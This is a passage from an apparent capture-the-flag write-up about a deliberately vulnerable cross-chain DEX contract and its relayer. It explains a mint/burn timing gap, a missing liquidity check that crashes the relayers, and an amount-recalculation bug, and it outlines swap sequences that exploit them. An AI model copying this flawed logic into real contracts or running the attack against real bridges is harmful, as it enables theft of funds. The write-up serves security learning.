        MessageType messageType;
        address from;
        address receiver;
        bytes32 srcToken;
        bytes32 dstToken;
        uint256 srcChainId;
        uint256 dstChainId;
        uint256 amount;
    }

    event MessageSent(Message message);

    constructor(address _relayer, Token[] memory _tokens) {
        relayer = _relayer;
        tokens = _tokens;

        tokenMapping[keccak256(abi.encodePacked(&amp;#34;USDC&amp;#34;))] = address(tokens[0]);
        tokenMapping[keccak256(abi.encodePacked(&amp;#34;PURR&amp;#34;))] = address(tokens[1]);
        tokenMapping[keccak256(abi.encodePacked(&amp;#34;MOODENG&amp;#34;))] = address(tokens[2]);
    }

    function handleMessage(Message calldata message) external payable onlyRelayer {

        assert(message.dstChainId == block.chainid);

        if(message.messageType == MessageType.LiquidityRequest) {
            emit MessageSent(Message({
                messageType: MessageType.LiquidityResponse,
                from: message.from,
                receiver: message.receiver,
                srcToken: message.srcToken,
                dstToken: message.dstToken,
                srcChainId: message.dstChainId,
                dstChainId: message.srcChainId,
                amount: message.amount
            }));
        } else if(message.messageType == MessageType.LiquidityResponse) {
            // handled by relayer
        } else if(message.messageType == MessageType.SwapRequest) {
            _swap(address(this), message.receiver, message.amount, message.srcToken, message.dstToken);
        } else {
            revert(&amp;#34;Invalid message type&amp;#34;);
        }
    }

    function swap(address receiver, bytes32 srcToken, bytes32 dstToken, uint256 amount, bool isCrosschain) external payable {
        if(isCrosschain) {
            _crossSwap(msg.sender, receiver, amount, srcToken, dstToken);
        } else {
            _swap(msg.sender, receiver, amount, srcToken, dstToken);
        }
    }

    function _crossSwap(address from, address receiver, uint256 amount, bytes32 srcToken, bytes32 dstToken) internal {
        Token srcTokenAddress = Token(tokenMapping[srcToken]);
        srcTokenAddress.transferFrom(from, address(this), amount);

        emit MessageSent(Message({
            messageType: MessageType.SwapRequest,
            from: from,
            receiver: receiver,
            srcToken: srcToken,
            dstToken: dstToken,
            srcChainId: block.chainid,
            dstChainId: block.chainid == CODE_CHAIN ? GATE_CHAIN : CODE_CHAIN,
            amount: amount
        }));
    }
    
    function _swap(address from, address receiver, uint256 amount, bytes32 srcToken, bytes32 dstToken) internal {
        uint256 rate = _getRate(srcToken, dstToken);
        Token srcTokenAddress = Token(tokenMapping[srcToken]);
        Token dstTokenAddress = Token(tokenMapping[dstToken]);
        uint256 targetAmount = amount * rate / 1e6;
        uint256 diffAmount = 0;

        if(dstTokenAddress.balanceOf(address(this)) &amp;lt; targetAmount) {
            diffAmount = targetAmount - dstTokenAddress.balanceOf(address(this));
            targetAmount = dstTokenAddress.balanceOf(address(this));
            amount = _getRate(dstToken, srcToken) * targetAmount / 1e6;
            emit MessageSent(Message({
                messageType: MessageType.LiquidityRequest,
                from: address(this),
                receiver: receiver,
                srcToken: srcToken,
                dstToken: dstToken,
                srcChainId: block.chainid,
                dstChainId: block.chainid == CODE_CHAIN ? GATE_CHAIN : CODE_CHAIN,
                amount: diffAmount
            }));
        }
        if(from != address(this)) {
            srcTokenAddress.transferFrom(from, address(this), amount);
        }
        dstTokenAddress.transfer(receiver, targetAmount);
    }

    function _getRate(bytes32 srcToken, bytes32 dstToken) internal view returns (uint256) {
        uint8 srcIdx = _getTokenIndex(srcToken);
        uint8 dstIdx = _getTokenIndex(dstToken);

        uint256 srcRate = rates[srcIdx];
        uint256 dstRate = rates[dstIdx];

        return (srcRate * 1e6) / dstRate;
    }

    function _getTokenIndex(bytes32 token) internal pure returns (uint8) {
        if (token == keccak256(abi.encodePacked(&amp;#34;USDC&amp;#34;))) return 0;
        if (token == keccak256(abi.encodePacked(&amp;#34;PURR&amp;#34;))) return 1;
        if (token == keccak256(abi.encodePacked(&amp;#34;MOODENG&amp;#34;))) return 2;
        revert(&amp;#34;Unknown token&amp;#34;);
    }

    function getTokenAddress(string memory symbol) public view returns (address) {
        return tokenMapping[keccak256(abi.encodePacked(symbol))];
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The contract facilitates swapping between 3 tokens, USDC, PURR and MOODENG with constant rates.&lt;/p&gt;
&lt;p&gt;The rates are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1 USDC = 1 USDC&lt;/li&gt;
&lt;li&gt;1 PURR = 0.2 USDC&lt;/li&gt;
&lt;li&gt;1 MOODENG = 0.19 USDC&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is done through the &lt;code&gt;swap&lt;/code&gt; function, which has a &lt;code&gt;isCrosschain&lt;/code&gt; flag to specify whether the receiver would receive the tokens on the current chain, or the opposite chain, and calls &lt;code&gt;_swap&lt;/code&gt; or &lt;code&gt;_crossSwap&lt;/code&gt; respectively.&lt;/p&gt;
&lt;p&gt;For example, you could swap 1 USDC on the GATE chain for 5 PURR on the CODE chain. You can also swap the same token, so you could swap 1 USDC on GATE chain for 1 USDC on CODE chain, essentially bridging the token.&lt;/p&gt;
&lt;p&gt;Cross-chain messaging works as the DEX both acts as a cross-chain message sender and receiver. Cross-chain messages are sent through emitting &lt;code&gt;MessageSent&lt;/code&gt; events, which are then processed by the relayer off-chain, and the relayer relays these messages to the DEX contract on the other chain by calling &lt;code&gt;handleMessage&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;listen_message_sent_async&lt;/span&gt;(src_contract, dst_contract, chain_id, tokens, stop_event):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        event_filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; src_contract&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;events&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MessageSent&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create_filter(from_block&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;latest&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; stop_event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;is_set():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            events &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; event_filter&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_new_entries()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; events:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; event &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; events:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    event_args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; event[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;args&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    event_message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; event_args[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CODE&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; chain_id &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; CODE_CHAIN &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GATE&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; Chain] MessageSent: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;event_message&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    print(event_message)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;messageType&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; LiquidityRequest:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        tx_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tokens[event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dstToken&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex()]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;functions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mint(event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;receiver&amp;#39;&lt;/span&gt;], event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amount&amp;#39;&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;transact()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;messageType&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; LiquidityResponse:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        tx_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tokens[event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dstToken&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex()]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;functions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;burn(event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;from&amp;#39;&lt;/span&gt;], event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amount&amp;#39;&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;transact()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    message_tuple &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;messageType&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;from&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;receiver&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;srcToken&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dstToken&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;srcChainId&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dstChainId&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        event_message[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amount&amp;#39;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    tx_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dst_contract&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;functions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;handleMessage(message_tuple)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;transact()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; asyncio&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that there are two relayers, one for relaying messages from CODE chain to GATE chain, and another for relaying GATE chain to CODE chain.&lt;/p&gt;
&lt;p&gt;To illustrate this, let&amp;rsquo;s take a look at a diagram of what happens during a cross chain swap of GATE chain to CODE chain. Hopefully this will make things more clear.&lt;/p&gt;

  &lt;img src=&#34;./img/cross-swap.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;h4 id=&#34;cross-chain-liquidity-handling&#34;&gt;Cross-chain liquidity handling&lt;/h4&gt;
&lt;p&gt;Now, let&amp;rsquo;s consider the scenario where one DEX has insufficient liquidity, for example, swapping 130 USDC for 650 PURR when the DEX only has 600 PURR - what happens then?&lt;/p&gt;
&lt;p&gt;If we look at the &lt;code&gt;_swap()&lt;/code&gt; code, we see that there is logic to handle this case, when the target token amount is more than the DEX&amp;rsquo;s balance of the destination token.&lt;/p&gt;
&lt;p&gt;When this is the case:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the difference in tokens is calculated and used as the amount in the &lt;code&gt;LiquidityRequest&lt;/code&gt; cross chain message&lt;/li&gt;
&lt;li&gt;the target amount is changed to the DEX&amp;rsquo;s token balance, essentially transferring the DEX&amp;rsquo;s entire token balance to the receiver&lt;/li&gt;
&lt;li&gt;&lt;code&gt;amount&lt;/code&gt; is recalculated to be based on the new target amount&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_swap&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; receiver, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; amount, &lt;span style=&#34;color:#66d9ef&#34;&gt;bytes32&lt;/span&gt; srcToken, &lt;span style=&#34;color:#66d9ef&#34;&gt;bytes32&lt;/span&gt; dstToken) &lt;span style=&#34;color:#66d9ef&#34;&gt;internal&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; rate &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _getRate(srcToken, dstToken);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Token srcTokenAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Token(tokenMapping[srcToken]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Token dstTokenAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Token(tokenMapping[dstToken]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; targetAmount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; amount &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; rate &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;e6;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;uint256&lt;/span&gt; diffAmount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(dstTokenAddress.balanceOf(&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;(this)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; targetAmount) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            diffAmount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; targetAmount &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; dstTokenAddress.balanceOf(&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;(this));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            targetAmount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dstTokenAddress.balanceOf(&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;(this));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            amount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _getRate(dstToken, srcToken) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; targetAmount &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;e6;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            emit MessageSent(Message({
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                messageType&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; MessageType.LiquidityRequest,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;(this),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                receiver&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; receiver,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                srcToken&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; srcToken,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                dstToken&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; dstToken,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                srcChainId&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; block.chainid,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                dstChainId&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; block.chainid &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; CODE_CHAIN &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; GATE_CHAIN &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; CODE_CHAIN,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                amount&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; diffAmount
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;(this)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            srcTokenAddress.transferFrom(&lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;(this), amount);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dstTokenAddress.transfer(receiver, targetAmount);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s look into what the &lt;code&gt;LiquidityRequest&lt;/code&gt; cross-chain message is for. Checking the relayer code, we see that upon receiving &lt;code&gt;LiquidityRequest&lt;/code&gt; event, the relayer will &lt;code&gt;mint&lt;/code&gt; the amount of specified tokens, in this case, the difference in the target output token amount and the DEX&amp;rsquo;s token balance.&lt;/p&gt;
&lt;p&gt;The relayer then forwards this event to the other chain through calling &lt;code&gt;handleMessage&lt;/code&gt;, which handles it by emitting &lt;code&gt;LiquidityResponse&lt;/code&gt;. When the other relayer receives &lt;code&gt;LiquidityResponse&lt;/code&gt;, it will burn the specified amount of tokens.&lt;/p&gt;
&lt;p&gt;Essentially, the relayers will mint the receiver the missing tokens on the current, and burn that amount of tokens on the other chain.&lt;/p&gt;
&lt;p&gt;The process is a bit confusing, so here&amp;rsquo;s another diagram to illustrate:&lt;/p&gt;

  &lt;img src=&#34;./img/swap-liquidity-request.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;The numbers represent the block number order that the actions are performed in.&lt;/p&gt;
&lt;h4 id=&#34;bugs---double-minting-and-business-logic-errors&#34;&gt;Bugs - Double minting and business logic errors&lt;/h4&gt;
&lt;p&gt;You might already see the potential for some critical vulnerabilities - there is a delay between the &lt;code&gt;mint&lt;/code&gt; and &lt;code&gt;burn&lt;/code&gt; calls, allowing for a brief window where tokens are minted on the source chain, but are not yet destroyed on the destination chain.&lt;/p&gt;
&lt;p&gt;Additionally, there is no check to see if the destination chain even contains enough liquidity - what happens in the above example if DEX on CODE chain contains less than 50 PURR?&lt;/p&gt;
&lt;p&gt;As you might expect, the &lt;code&gt;burn(DEX, 50)&lt;/code&gt; call will revert as the DEX does not have 50 tokens, and because the call reverted, the relayer would crash. Upon the relayer crashing, it does not start up again - the cross chain messaging breaks. What was more surprising was that &lt;strong&gt;both&lt;/strong&gt; relayers would crash, not just the relayer whose call reverted.&lt;/p&gt;
&lt;p&gt;There is also a bug in the &lt;code&gt;_swap&lt;/code&gt; function - for some reason, in the insufficient liquidity case, the amount of source tokens transferred from the user is recalculated based on the DEX&amp;rsquo;s current destination token balance.&lt;/p&gt;
&lt;p&gt;In the example in the diagram, when 130 USDC was swapped for 650 PURR and the DEX had 600 PURR, only $\frac{0.2}{1} \times 600 = 120$ USDC tokens were actually transferred from the user instead of $130$. This recalculation shouldn&amp;rsquo;t have happened at all, since we now own more than we put in, with 600 PURR transferred to us immediantly, then another 50 PURR minted via the relayer, all for the price of 120 USDC instead of 130 USDC.&lt;/p&gt;
&lt;h4 id=&#34;exploitation---implementing-the-attack&#34;&gt;Exploitation - implementing the attack&lt;/h4&gt;
&lt;p&gt;Ok, we now have a bunch of bugs to exploit, but it turns out that actually implementing the exploits was kinda tricky.&lt;/p&gt;
&lt;p&gt;Recall that we start with 100 USDC, 100 PURR, 100 MOODENG, and both DEXs on each chain starts with 600 USDC, 600 PURR, 600 MOODENG.&lt;/p&gt;
&lt;p&gt;Also recall the exchange rates:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1 USDC = 1 USDC&lt;/li&gt;
&lt;li&gt;1 PURR = 0.2 USDC&lt;/li&gt;
&lt;li&gt;1 MOODENG = 0.19 USDC&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To trigger the bugs, we need to perform a swap such that the DEX has insufficient destination tokens to fulfill our trade.&lt;/p&gt;
&lt;p&gt;We barely have enough tokens for this to work:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Swap 100 PURR -&amp;gt; 20 USDC&lt;/li&gt;
&lt;li&gt;Swap 100 MOODENG -&amp;gt; 19 USDC&lt;/li&gt;
&lt;li&gt;Swap 139 USDC -&amp;gt; 695 PURR&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;with all swaps done on the GATE chain (where we initially have tokens).&lt;/p&gt;
&lt;p&gt;As 695 &amp;gt; 600, it seems like this will trigger the bugs, but remember we actually swapped 100 PURR for 20 USDC, therefore the DEX now has 700 PURR instead of 600, so it has sufficient liquidity for our swap.&lt;/p&gt;
&lt;p&gt;We can work around this by doing the last swap of 139 USDC -&amp;gt; 695 PURR on the CODE chain by first bridging over the USDC then swapping. Since the CODE chain has 600 PURR, this is insufficient liquidity and will trigger the bug.&lt;/p&gt;
&lt;p&gt;Note that because of the amount recalculation bug discussed previously, the swap of 139 USDC -&amp;gt; 695 PURR is actually 120 USDC -&amp;gt; 600 + 95 PURR.&lt;/p&gt;
&lt;p&gt;Below is a diagram that illustrates these swaps:&lt;/p&gt;

  &lt;img src=&#34;./img/swaps.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;But let&amp;rsquo;s take a moment to consider exploiting the other bugs we found - the lack of checks of sufficient liquidity on the other chain. For example, if there is 100 PURR on the GATE chain, and we have 200 PURR, swapping PURR for PURR will result in double-minting, as we only spend 100 PURR and receive 100 PURR back, but also get minted another 100 PURR by the relayer, now having 300 PURR.&lt;/p&gt;
